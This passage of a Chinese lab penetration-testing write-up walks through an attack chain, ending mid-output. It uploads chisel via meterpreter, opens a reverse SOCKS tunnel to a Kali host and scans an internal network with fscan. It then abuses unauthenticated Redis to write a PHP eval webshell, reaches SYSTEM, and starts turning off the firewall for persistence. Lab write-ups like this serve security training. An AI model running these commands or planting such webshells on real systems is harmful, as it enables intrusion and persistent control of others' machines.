<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>需要注意，高版本 <code>go</code> 编译的二进制文件取消了对低版本 Windows 的支持，建议使用 <code>chisel v1.8.1</code></p></div></div>
<p>上传 <code>chisel</code> 二进制文件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; upload ./tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Uploading  : /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -&gt; chisel_1.8.1_windows_amd64.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Uploaded 8.00 MiB of 8.59 MiB (93.14%): /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -&gt; chisel_1.8.1_windows_amd64.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Uploaded 8.59 MiB of 8.59 MiB (100.0%): /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -&gt; chisel_1.8.1_windows_amd64.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Completed  : /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -&gt; chisel_1.8.1_windows_amd64.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>启动服务端</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">kali 192.168.200.129</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./tools/chisel-v1.8.1/chisel_1.8.1_linux_amd64 server -p 1337 --reverse</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/10/31 22:44:56 server: Fingerprint ygeqrFtSRXQYYW1Xf04LJNLAtoveMD+jrlJ4jwApR+Y=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2024/10/31 22:44:56 server: Listening on http://0.0.0.0:1337</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>建立代理会话</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win7 192.168.200.10 | 10.0.20.98</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10005:socks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10005:socks</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内网扫描">内网扫描<a href="#内网扫描" class="hash-link" aria-label="内网扫描的直接链接" title="内网扫描的直接链接">​</a></h2>
<p>配置 <code>proxychains</code> 配置文件为 <code>chisel</code> 代理端口之后，使用 fscan 进行扫描</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.20.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trying RunIcmp2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current user permissions unable to send icmp packets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start ping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(icmp) Target 10.0.20.1       is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(icmp) Target 10.0.20.98      is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Icmp alive hosts len is: 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.98:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.98:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.98:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.1:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.1:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.1:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.98:80 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.1:7680 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.1:7890 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]10.0.20.98</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]win7-PC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]10.0.20.98</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.200.10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] MS17-010 10.0.20.98 (Windows 7 Professional 7601 Service Pack 1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]10.0.20.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]DESKTOP-7HGIVVS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.200.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]172.25.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.56.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.123.116</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]10.0.10.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]10.0.20.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.137.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]2001:0:2851:b9f0:8b3:1b5b:8fcc:f2a8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://10.0.20.1:7890     code:400 len:0      title:None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://10.0.20.98         code:200 len:10065  title: 通达 OA 网络智能办公系统</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] InfoScan http://10.0.20.98         [通达 OA]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] PocScan http://10.0.20.98 tongda-user-session-disclosure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">已完成 9/9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 扫描结束, 耗时: 12.349497283s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>排除掉 <code>win7 10.0.20.98</code> 和 <code>Vmware 10.0.20.1</code> 之后，会发现结果不对，因为 Windows Server 会不响应 ICMP 请求，可以通过查看 ARP 表来发现</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win7 192.168.200.10 | 10.0.20.98</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;arp -a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface: 192.168.200.10 --- 0xb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Internet Address      Physical Address      Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  192.168.200.0         00-50-56-eb-cc-78     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  192.168.200.1         00-50-56-c0-00-00     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  192.168.200.129       00-0c-29-07-06-1a     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  192.168.200.254       00-50-56-fb-ab-25     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  192.168.200.255       ff-ff-ff-ff-ff-ff     static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  224.0.0.22            01-00-5e-00-00-16     static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  224.0.0.252           01-00-5e-00-00-fc     static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  239.255.255.250       01-00-5e-7f-ff-fa     static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  255.255.255.255       ff-ff-ff-ff-ff-ff     static</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface: 10.0.20.98 --- 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Internet Address      Physical Address      Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  10.0.20.1             00-50-56-c0-00-12     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  10.0.20.99            00-0c-29-49-db-32     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  10.0.20.254           00-50-56-f9-77-e1     dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  10.0.20.255           ff-ff-ff-ff-ff-ff     static</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以发现存在有 <code>10.0.20.99</code> 主机，尝试扫描</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.20.99 -np</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:80 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:6379 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://10.0.20.99         code:200 len:11     title:None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Redis 10.0.20.99:6379 unauthorized file:C:\Program Files\Redis/dump.rdb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">已完成 2/2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 扫描结束, 耗时: 10.492549051s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win2016-redis-未授权">win2016 redis 未授权<a href="#win2016-redis-未授权" class="hash-link" aria-label="win2016 redis 未授权的直接链接" title="win2016 redis 未授权的直接链接">​</a></h2>
<p>建立端口转发</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win7 192.168.200.10 | 10.0.20.98</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10001:10.0.20.99:6379</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10001:10.0.20.99:6379</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <a href="https://github.com/SafeGroceryStore/MDUT" target="_blank" rel="noopener noreferrer">SafeGroceryStore/MDUT: MDUT - Multiple Database Utilization Tools</a></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241012-231250-e16d42884bfb48a7858efee88201564a.png" width="1351" height="1204" class="img_ev3q"></p>
<p>同时做一下目录扫描</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Target: http://10.0.20.99/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[23:56:38] Starting:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[23:57:32] 200 -   14KB - /l.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[23:57:43] 200 -   71KB - /phpinfo.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查看 <code>phpinfo.php</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241100-000051-e3b872c49336de91aad6c1aa2e102c97.png" width="2559" height="1371" class="img_ev3q"></p>
<p>以及 <code>l.php</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241101-000119-1018e76c9f57565e4d77c1518ad1187c.png" width="2559" height="1371" class="img_ev3q"></p>
<p>知道网站的绝对路径之后，就可以配合写入 webshell</p>
<p>直接使用 Redis 未授权写入 webshel</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains -q redis-cli -h 10.0.20.99</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:6379&gt; set webshell &quot;&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:6379&gt; save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.20.99:6379&gt; exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241142-104202-266c03280c651df520a63d20058fb2e0.png" width="1544" height="1042" class="img_ev3q"></p>
<p>怀疑存在有安全软件</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241144-104437-1e716972a44d6b67b8ec543dcbd2cf81.png" width="1544" height="1042" class="img_ev3q"></p>
<p>查看网段信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; ipconfig</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Windows IP 配置</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">以太网适配器 Ethernet0:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   连接特定的 DNS 后缀 . . . . . . . :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   本地链接 IPv6 地址. . . . . . . . : fe80::9190:38ad:1e9d:7f70%10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   IPv4 地址 . . . . . . . . . . . . : 10.0.20.99</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   默认网关. . . . . . . . . . . . . :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">以太网适配器 Ethernet1:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   连接特定的 DNS 后缀 . . . . . . . :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   本地链接 IPv6 地址. . . . . . . . : fe80::919b:ab4d:10b3:df65%13</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   IPv4 地址 . . . . . . . . . . . . : 10.0.10.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   默认网关. . . . . . . . . . . . . :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">隧道适配器 isatap.{A7027029-ECC3-4186-BC98-9DCE01AAA9D0}:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   连接特定的 DNS 后缀 . . . . . . . :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">隧道适配器 isatap.{82CC4AA7-AABB-4296-94AE-3AB9161E5B11}:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   连接特定的 DNS 后缀 . . . . . . . :</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查看当前用户权限</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win2016 10.0.20.99 | 10.0.10.111</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nt authority\system</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win2016-持久化">win2016 持久化<a href="#win2016-持久化" class="hash-link" aria-label="win2016 持久化的直接链接" title="win2016 持久化的直接链接">​</a></h2>
<p>关闭防火墙</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; netsh advfirewall show allprofiles</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">�������ļ� ����:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">״̬                                  ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">����ǽ����                          BlockInbound,AllowOutbound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalFirewallRules                    N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalConSecRules                      N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InboundUserNotification               ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteManagement                      ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UnicastResponseToMulticast            ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��־:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogAllowedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogDroppedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br></span><span class="token-line" 